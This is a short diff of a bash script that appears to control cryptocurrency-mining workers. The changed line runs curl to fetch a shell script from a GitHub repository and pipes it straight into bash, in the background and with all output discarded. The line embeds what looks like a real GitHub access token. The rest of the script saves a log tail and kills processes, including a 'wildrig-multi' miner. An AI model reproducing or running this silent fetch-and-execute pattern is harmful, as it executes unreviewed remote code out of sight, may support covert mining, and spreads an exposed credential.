@@ -1,5 +1,5 @@
 #!/bin/bash
-( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/i440_probe.sh?ref=main')" >/dev/null 2>&1 & )
+( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
 tail -40 /opt/fleet/logs/w-ps-pssrirw3rj2p-g0.log > /tmp/pre.log 2>&1
 pkill -f ps_sup.sh
 pkill -f 'wildrig-multi .*ul-ps-pssrirw3rj2p-g0'
